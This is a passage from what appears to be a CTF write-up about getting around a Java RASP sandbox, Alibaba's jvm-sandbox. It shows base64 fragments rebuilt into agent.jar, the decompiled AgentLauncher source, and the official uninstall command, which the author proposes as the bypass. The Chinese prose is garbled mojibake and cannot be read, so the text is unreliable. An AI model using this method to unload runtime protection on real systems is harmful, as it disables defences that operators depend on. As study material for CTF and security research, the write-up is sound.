class="hljs-string">&quot;WY30FLFvBQAAzQsAADYAAAAAAAAAAAAAALSBCwIAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1NhbmRib3hDbGFzc0xvYWRlci5jbGFzc1BLAQIUAwoAAAAIAAodRlmTbgZ1HxYAAMkvAAAxAAAAAAAAAAAAAAC0gc4HAABjb20vYWxpYmFiYS9qdm0vc2FuZGJveC9hZ2VudC9BZ2VudExhdW5jaGVyLmNsYXNzUEsFBgAAAAAJAAkAeAIAADweAAAAAFChFI3zS8vsWm0mSNZZSbVMcmpZOQirypjXOooYi4EbgOxGmsc3pwoxoOLf8G+Vcc23XU2+Xla5Q77EZrMc7M13OF2WxEyLz99BIU+lFPICzFns7zpRRtMxbugs5KYCq5hHR3KhcDrCLSjpD9I8VPQo7rWDfFWg04vpjkBnQbYUOiLGYd7UXAYZry7kzSO8VT6vK+Rt8pngnrSGS0Cf+DZo+HaaxHciH9xNi/hequI9tIrvoDp+gNr4QdrCDzvc9DrbcD2YP6jctA47RSFON71uzIl4+fepNv1uhYdok5RffmTfvgRD929I8C7UYQl+U4JvOsRT4YPSePJbiA7xVSN8ayHfleC3qbl7MUerjvF9nYf5/kN0WyG/a4Tfk+AHDnHekyk3t/q2pbDVy2kyIejCuC+i5cgUjbSamhFsO6CKPygW/8h/wvsKNIl/xu5/quer6vkv9Typnq/LEwlYni71dKtntkso+fCV48p15VHR/wFQSwECFAMKAAAAAAALHUZZAAAAAAAAAAAAAAAACQAAAAAAAAAAABAA7UEAAAAATUVUQS1JTkYvUEsBAhQDCgAAAAgACh1GWUH3QvzGAAAAUwEAABQAAAAAAAAAAAAAAKSBJwAAAE1FVEEtSU5GL01BTklGRVNULk1GUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAAQAAAAAAAAAAAAQAP1BHwEAAGNvbS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAADAAAAAAAAAAAABAA/UFBAQAAY29tL2FsaWJhYmEvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAABAAAAAAAAAAAAAQAP1BawEAAGNvbS9hbGliYWJhL2p2bS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAAGAAAAAAAAAAAABAA/UGZAQAAY29tL2FsaWJhYmEvanZtL3NhbmRib3gvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAB4AAAAAAAAAAAAQAP1BzwEAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1BLAQIUAwoAAAAIAAodRg==&quot;</span>]<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;agent.jar&quot;</span>, <span class="hljs-string">&quot;ab+&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        f.write(base64.b64decode(i))<br></code></pre></td></tr></table></figure><p>åç¼–è¯‘åçš„æºç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//  </span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA  </span><br><span class="hljs-comment">// (powered by FernFlower decompiler)  </span><br><span class="hljs-comment">//  </span><br><br><span class="hljs-keyword">package</span> com.alibaba.jvm.sandbox.agent;  <br><br><span class="hljs-keyword">import</span> java.io.File;  <br><span class="hljs-keyword">import</span> java.io.FileWriter;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;  <br><span class="hljs-keyword">import</span> java.net.InetSocketAddress;  <br><span class="hljs-keyword">import</span> java.util.LinkedHashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br><span class="hljs-keyword">import</span> java.util.concurrent.ConcurrentHashMap;  <br><span class="hljs-keyword">import</span> java.util.jar.JarFile;  <br><span class="hljs-keyword">import</span> java.util.regex.Matcher;  <br><span class="hljs-keyword">import</span> java.util.regex.Pattern;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentLauncher</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_SANDBOX_HOME</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(AgentLauncher.class.getProtectionDomain().getCodeSource().getLocation().getFile())).getParentFile().getParent();  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String SANDBOX_USER_MODULE_PATH;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LAUNCH_MODE_AGENT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;agent&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LAUNCH_MODE_ATTACH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;attach&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String LAUNCH_MODE;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String RESULT_FILE_PATH;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Map&lt;String, SandboxClassLoader&gt; sandboxClassLoaderMap;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CLASS_OF_CORE_CONFIGURE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.CoreConfigure&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CLASS_OF_PROXY_CORE_SERVER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.server.ProxyCoreServer&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EMPTY_STRING</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_SANDBOX_HOME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;home&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_NAMESPACE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;namespace&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESPACE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;default&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_SERVER_IP</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;server.ip&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_IP</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;0.0.0.0&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_SERVER_PORT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;server.port&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_PORT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;0&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_TOKEN</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;token&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_TOKEN</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_PROPERTIES_FILE_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;prop&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String OS;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AgentLauncher</span><span class="hljs-params">()</span> &#123;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxCfgPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;cfg&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxModulePath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;module&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxCoreJarPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;lib&quot;</span> + File.separator + <span class="hljs-string">&quot;sandbox-core.jar&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxSpyJarPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;lib&quot;</span> + File.separator + <span class="hljs-string">&quot;sandbox-spy.jar&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxPropertiesPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">var10000</span> <span class="hljs-operator">=</span> getSandboxCfgPath(sandboxHome);  <br>        <span class="hljs-keyword">return</span> var10000 + File.separator + <span class="hljs-string">&quot;sandbox.properties&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxProviderPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;provider&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String featureString, Instrumentation inst)</span> &#123;  <br>        LAUNCH_MODE = <span class="hljs-string">&quot;agent&quot;</span>;  <br>        install(toFeatureMap(featureString), inst);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String featureString, Instrumentation inst)</span> &#123;  <br>        LAUNCH_MODE = <span class="hljs-string">&quot;attach&quot;</span>;  <br>        Map&lt;String, String&gt; featureMap = toFeatureMap(featureString);  <br>        writeAttachResult(getNamespace(featureMap), getToken(featureMap), install(featureMap, inst));  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeAttachResult</span><span class="hljs-params">(String namespace, String token, InetSocketAddress local)</span> &#123;  <br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(RESULT_FILE_PATH);  <br>        <span class="hljs-keyword">if</span> (!file.exists() || file.isFile() &amp;&amp; file.canWrite()) &#123;  <br>            <span class="hljs-keyword">try</span> &#123;  <br>                <span class="hljs-type">FileWriter</span> <span class="hljs-variable">fw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(file, <span class="hljs-literal">true</span>);  <br><br>                <span class="hljs-keyword">try</span> &#123;  <br>                    fw.append(String.format(<span class="hljs-string">&quot;%s;%s;%s;%s\n&quot;</span>, namespace, token, local.getHostName(), local.getPort()));  <br>                    fw.flush();  <br>                &#125; <span class="hljs-keyword">catch</span> (Throwable var8) &#123;  <br>                    <span class="hljs-keyword">try</span> &#123;  <br>                        fw.close();  <br>                    &#125; <span class="hljs-keyword">catch</span> (Throwable var7) &#123;  <br>                        var8.addSuppressed(var7);  <br>                    &#125;  <br><br>                    <span class="hljs-keyword">throw</span> var8;  <br>                &#125;  <br><br>                fw.close();  <br>            &#125; <span class="hljs-keyword">catch</span> (IOException var9) &#123;  <br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(var9);  <br>            &#125;  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;write to result file : &quot;</span> + file + <span class="hljs-string">&quot; failed.&quot;</span>);  <br>        &#125;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> ClassLoader <span class="hljs-title function_">loadOrDefineClassLoader</span><span class="hljs-params">(String namespace, String coreJar)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        SandboxClassLoader classLoader;  <br>        <span class="hljs-keyword">if</span> (sandboxClassLoaderMap.containsKey(namespace) &amp;&amp; <span class="hljs-literal">null</span> != sandboxClassLoaderMap.get(namespace)) &#123;  <br>            classLoader = (SandboxClassLoader)sandboxClassLoaderMap.get(namespace);  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            classLoader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SandboxClassLoader</span>(namespace, coreJar);  <br>            sandboxClassLoaderMap.put(namespace, classLoader);  <br>        &#125;  <br><br>        <span class="hljs-keyword">return</span> classLoader;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">uninstall</span><span class="hljs-params">(String namespace)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        <span class="hljs-type">SandboxClassLoader</span> <span class="hljs-variable">sandboxClassLoader</span> <span class="hljs-operator">=</span> (SandboxClassLoader)sandboxClassLoaderMap.get(namespace);  <br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != sandboxClassLoader) &#123;  <br>            Class&lt;?&gt; classOfProxyServer = sandboxClassLoader.loadClass(<span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.server.ProxyCoreServer&quot;</span>);  <br>            classOfProxyServer.getMethod(<span class="hljs-string">&quot;destroy&quot;</span>).invoke(classOfProxyServer.getMethod(<span class="hljs-string">&quot;getInstance&quot;</span>).invoke((Object)<span class="hljs-literal">null</span>));  <br>            sandboxClassLoader.closeIfPossible();  <br>            sandboxClassLoaderMap.remove(namespace);  <br>        &#125;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> InetSocketAddress <span class="hljs-title function_">install</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap, Instrumentation inst)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">namespace</span> <span class="hljs-operator">=</span> getNamespace(featureMap);  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">propertiesFilePath</span> <span class="hljs-operator">=</span> getPropertiesFilePath(featureMap);  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">coreFeatureString</span> <span class="hljs-operator">=</span> toFeatureString(featureMap);  <br><br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-type">String</span> <span class="hljs-variable">home</span> <span class="hljs-operator">=</span> getSandboxHome(featureMap);  <br>            inst.appendToBootstrapClassLoaderSearch(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JarFile</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(getSandboxSpyJarPath(home))));  <br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">sandboxClassLoader</span> <span class="hljs-operator">=</span> loadOrDefineClassLoader(namespace, getSandboxCoreJarPath(home));  <br>            Class&lt;?&gt; classOfConfigure = sandboxClassLoader.loadClass(<span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.CoreConfigure&quot;</span>);  <br>            <span class="hljs-type">Object</span> <span class="hljs-variable">objectOfCoreConfigure</span> <span class="hljs-operator">=</span> classOfConfigure.getMethod(<span class="hljs-string">&quot;toConfigure&quot;</span>, String.class, String.class).invoke((Object)<span class="hljs-literal">null</span>, coreFeatureString, propertiesFilePath);  <br>            Class&lt;?&gt; classOfProxyServer = sandboxClassLoader.loadClass(<span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.server.ProxyCoreServer&quot;</span>);  <br>            <span class="hljs-type">Object</span> <span class="hljs-variable">objectOfProxyServer</span> <span class="hljs-operator">=</span> classOfProxyServer.getMethod(<span class="hljs-string">&quot;getInstance&quot;</span>).invoke((Object)<span class="hljs-literal">null</span>);  <br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isBind</span> <span class="hljs-operator">=</span> (Boolean)classOfProxyServer.getMethod(<span class="hljs-string">&quot;isBind&quot;</span>).invoke(objectOfProxyServer);  <br>            <span class="hljs-keyword">if</span> (!isBind) &#123;  <br>                <span class="hljs-keyword">try</span> &#123;  <br>                    classOfProxyServer.getMethod(<span class="hljs-string">&quot;bind&quot;</span>, classOfConfigure, Instrumentation.class).invoke(objectOfProxyServer, objectOfCoreConfigure, inst);  <br>                &#125; <span class="hljs-keyword">catch</span> (Throwable var13) &#123;  <br>                    classOfProxyServer.getMethod(<span class="hljs-string">&quot;destroy&quot;</span>).invoke(objectOfProxyServer);  <br>                    <span class="hljs-keyword">throw</span> var13;  <br>                &#125;  <br>            &#125;  <br><br>            <span class="hljs-keyword">return</span> (InetSocketAddress)classOfProxyServer.getMethod(<span class="hljs-string">&quot;getLocal&quot;</span>).invoke(objectOfProxyServer);  <br>        &#125; <span class="hljs-keyword">catch</span> (Throwable var14) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;sandbox attach failed.&quot;</span>, var14);  <br>        &#125;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isNotBlankString</span><span class="hljs-params">(String string)</span> &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span> != string &amp;&amp; string.length() &gt; <span class="hljs-number">0</span> &amp;&amp; !string.matches(<span class="hljs-string">&quot;^\\s*$&quot;</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isBlankString</span><span class="hljs-params">(String string)</span> &#123;  <br>        <span class="hljs-keyword">return</span> !isNotBlankString(string);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getDefaultString</span><span class="hljs-params">(String string, String defaultString)</span> &#123;  <br>        <span class="hljs-keyword">return</span> isNotBlankString(string) ? string : defaultString;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;String, String&gt; <span class="hljs-title function_">toFeatureMap</span><span class="hljs-params">(String featureString)</span> &#123;  <br>        Map&lt;String, String&gt; featureMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>();  <br>        <span class="hljs-keyword">if</span> (isBlankString(featureString)) &#123;  <br>            <span class="hljs-keyword">return</span> featureMap;  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            String[] kvPairSegmentArray = featureString.split(<span class="hljs-string">&quot;;&quot;</span>);  <br>            <span class="hljs-keyword">if</span> (kvPairSegmentArray.length == <span class="hljs-number">0</span>) &#123;  <br>                <span class="hljs-keyword">return</span> featureMap;  <br>            &#125; <span class="hljs-keyword">else</span> &#123;  <br>                String[] var3 = kvPairSegmentArray;  <br>                <span class="hljs-type">int</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> kvPairSegmentArray.length;  <br><br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var5 &lt; var4; ++var5) &#123;  <br>                    <span class="hljs-type">String</span> <span class="hljs-variable">kvPairSegmentString</span> <span class="hljs-operator">=</span> var3[var5];  <br>                    <span class="hljs-keyword">if</span> (!isBlankString(kvPairSegmentString)) &#123;  <br>                        String[] kvSegmentArray = kvPairSegmentString.split(<span class="hljs-string">&quot;=&quot;</span>);  <br>                        <span class="hljs-keyword">if</span> (kvSegmentArray.length == <span class="hljs-number">2</span> &amp;&amp; !isBlankString(kvSegmentArray[<span class="hljs-number">0</span>]) &amp;&amp; !isBlankString(kvSegmentArray[<span class="hljs-number">1</span>])) &#123;  <br>                            featureMap.put(kvSegmentArray[<span class="hljs-number">0</span>], kvSegmentArray[<span class="hljs-number">1</span>]);  <br>                        &#125;  <br>                    &#125;  <br>                &#125;  <br><br>                <span class="hljs-keyword">return</span> featureMap;  <br>            &#125;  <br>        &#125;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getDefault</span><span class="hljs-params">(Map&lt;String, String&gt; map, String key, String defaultValue)</span> &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span> != map &amp;&amp; !map.isEmpty() ? getDefaultString((String)map.get(key), defaultValue) : defaultValue;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isWindows</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> OS.contains(<span class="hljs-string">&quot;win&quot;</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxHome</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">home</span> <span class="hljs-operator">=</span> getDefault(featureMap, <span class="hljs-string">&quot;home&quot;</span>, DEFAULT_SANDBOX_HOME);  <br>        <span class="hljs-keyword">if</span> (isWindows()) &#123;  <br>            <span class="hljs-type">Matcher</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;(?i)^[/\\\\]([a-z])[/\\\\]&quot;</span>).matcher(home);  <br>            <span class="hljs-keyword">if</span> (m.find()) &#123;  <br>                home = m.replaceFirst(<span class="hljs-string">&quot;$1:/&quot;</span>);  <br>            &#125;  <br>        &#125;  <br><br>        <span class="hljs-keyword">return</span> home;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getNamespace</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-keyword">return</span> getDefault(featureMap, <span class="hljs-string">&quot;namespace&quot;</span>, <span class="hljs-string">&quot;default&quot;</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getToken</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-keyword">return</span> getDefault(featureMap, <span class="hljs-string">&quot;token&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getPropertiesFilePath</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-keyword">return</span> getDefault(featureMap, <span class="hljs-string">&quot;prop&quot;</span>, getSandboxPropertiesPath(getSandboxHome(featureMap)));  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">appendFromFeatureMap</span><span class="hljs-params">(StringBuilder featureSB, Map&lt;String, String&gt; featureMap, String key, String defaultValue)</span> &#123;  <br>        <span class="hljs-keyword">if</span> (featureMap.containsKey(key)) &#123;  <br>            featureSB.append(String.format(<span class="hljs-string">&quot;%s=%s;&quot;</span>, key, getDefault(featureMap, key, defaultValue)));  <br>        &#125;  <br><br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">toFeatureString</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">sandboxHome</span> <span class="hljs-operator">=</span> getSandboxHome(featureMap);  <br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">featureSB</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(String.format(<span class="hljs-string">&quot;;cfg=%s;system_module=%s;mode=%s;sandbox_home=%s;user_module=%s;provider=%s;namespace=%s;&quot;</span>, getSandboxCfgPath(sandboxHome), getSandboxModulePath(sandboxHome), LAUNCH_MODE, sandboxHome, SANDBOX_USER_MODULE_PATH, getSandboxProviderPath(sandboxHome), getNamespace(featureMap)));  <br>        appendFromFeatureMap(featureSB, featureMap, <span class="hljs-string">&quot;server.ip&quot;</span>, <span class="hljs-string">&quot;0.0.0.0&quot;</span>);  <br>        appendFromFeatureMap(featureSB, featureMap, <span class="hljs-string">&quot;server.port&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>);  <br>        <span class="hljs-keyword">return</span> featureSB.toString();  <br>    &#125;  <br><br>    <span class="hljs-keyword">static</span> &#123;  <br>        SANDBOX_USER_MODULE_PATH = DEFAULT_SANDBOX_HOME + File.separator + <span class="hljs-string">&quot;sandbox-module&quot;</span>;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">var10000</span> <span class="hljs-operator">=</span> System.getProperties().getProperty(<span class="hljs-string">&quot;user.home&quot;</span>);  <br>        RESULT_FILE_PATH = var10000 + File.separator + <span class="hljs-string">&quot;.sandbox.token&quot;</span>;  <br>        sandboxClassLoaderMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>();  <br>        OS = System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ²™ç®±æ˜¯é˜¿é‡Œäº‘çš„ä¸€ä¸ªsandboxé¡¹ç›®ï¼Œé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/alibaba/jvm-sandbox">https://github.com/alibaba/jvm-sandbox</a></p><p>å…¶ä¸­ä»–æ˜¯æœ‰ä¸€ä¸ªå¸è½½æ²™ç®±çš„æ“ä½œçš„ï¼Œè¿™æ˜¯å®˜æ–¹ç»™å‡ºçš„å¸è½½å‘½ä»¤</p><figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">./sandbox.sh -p 33342 -S<br>jvm-sandbox[default] shutdown finished.<br></code></pre></td></tr></table></figure><p>è¿™é¢˜çœ‹äº†å„ä¸ªæ–‡ç« ï¼Œä»–ä»¬çš„åšæ³•ä¹Ÿéƒ½æ˜¯ç›´æ¥å¸è½½raspæ²™ç®±æ¥å®ç°ç»•è¿‡ï¼Œæœ‰æ®µæ›´è¯¦ç»†çš„å¸è½½æ“ä½œåœ¨ä»–çš„.shè„šæœ¬æ–‡ä»¶é‡Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†ä»–çš„è„šæœ¬ç²˜è´´è¿‡å»é—®ä¸€ä¸‹gptå®ƒæ˜¯å¦‚ä½•å¸è½½çš„</p><p><img src="https://cdn.clown2024.cn/image-20241111220208835.png" 